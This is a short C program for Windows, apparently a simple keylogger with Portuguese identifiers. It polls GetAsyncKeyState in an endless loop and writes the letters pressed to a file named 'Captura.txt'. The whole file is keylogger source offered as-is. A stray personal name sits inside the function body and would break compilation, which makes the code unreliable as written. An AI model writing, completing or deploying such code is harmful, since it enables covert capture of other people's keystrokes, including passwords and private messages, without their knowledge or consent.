#include <stdio.h>
#include <windows.h>

int main( void ){
    int result, teclas;
    FILE *arquivo;

    arquivo = fopen("Captura.txt", "w");

    while(1){
        for( teclas = 64; teclas <= 90; teclas++ ){
            Sleep(1);

            result = GetAsyncKeyState(teclas);

            if(result == -32767){
                fprintf(arquivo, "%c", teclas);
            }
        }
    }
    return 0;Artur Mendes Santos
}
